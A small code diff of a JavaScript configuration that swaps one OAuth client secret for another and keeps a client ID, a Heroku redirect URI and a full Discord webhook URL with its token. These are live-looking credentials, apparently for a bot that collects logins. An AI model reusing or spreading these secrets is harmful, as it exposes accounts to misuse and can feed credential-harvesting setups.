@@ -1,5 +1,5 @@
 // Configuration
-const client_secret = 'yOU8Q~Z9ppxzk8S-SSaX6zLtYK4QZmxB2ZzR0cGt'
+const client_secret = 'Z9~8Q~KfD3194FZ2-3ud4txUPyjkNrDhdjbhkaI8'
 const client_id = '0390611b-0c21-4c74-a634-2bef5027e1b4'
 const redirect_uri = 'https://skyhelperbot.herokuapp.com/'
 const webhook_url = 'https://discordapp.com/api/webhooks/1041466576811081728/FC81WDTPPUTioICMD0bNosVZv4JQ4IQAEyyWF7gn_LZRifr2Ad7tQwaGph_fI4cZbcun'
